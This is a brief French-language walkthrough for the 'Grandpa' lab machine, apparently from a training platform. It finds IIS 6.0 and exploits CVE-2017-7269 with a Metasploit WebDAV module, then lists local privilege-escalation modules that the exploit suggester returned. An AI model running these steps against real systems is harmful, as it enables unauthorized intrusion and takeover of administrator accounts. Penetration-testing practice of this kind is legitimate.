# Grandpa

IP : 10.129.24.10


## USER
nmap :
On voit un un serveur web est actif Microsoft-IIS/6.0 donc machine windows.
Quand on cherche on trouve une CVE bufferoverflox : 
	CVE-2017-7269


On peut l'exploiter pour s'introduire sur la machine:
	msfconsole

	use windows/iis/iis_webdav_scstoragepathfromurl

	run


Une foi l'exploit utilisé il faut le mettre en background:
	
	bg

puis chercher les vulnérabilité pour passer Admin

	post/multi/recon/local_exploit_suggester

	set SESSION 1

		 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
		 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
		 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
		 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
		 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
		 6   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.



